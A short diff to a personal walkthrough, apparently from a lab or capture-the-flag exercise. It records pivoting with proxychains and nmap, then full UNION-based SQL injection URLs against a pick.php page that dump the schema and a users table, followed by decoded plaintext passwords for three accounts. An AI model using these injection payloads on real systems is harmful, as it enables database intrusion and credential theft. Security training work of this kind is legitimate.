@@ -12,4 +12,11 @@ did proxychains nmap, came up with ports 22 and port 80 open
 then I made a tunnel to the 80 and went on the website.
 Found it had lists, so i did 
 http://127.0.0.1:41804/pick.php?product=7%20UNION%20select%20table_schema,column_name,%20table_name%20from%20information_schema.columns;#
-It didn't work on the first product
+It didn't work on the first product, did prod 7
+did 
+http://127.0.0.1:41804/pick.php?product=7%20UNION%20select%20user_id,%20name,%20username%20from%20siteusers.users;#
+and found passwords. Passwords are either going to be in ROT13 or Base64, converted they are
+
+AARON: apasswordyPa$$word
+user2:EaglesIsARE78
+user3:Bob4THEEapples
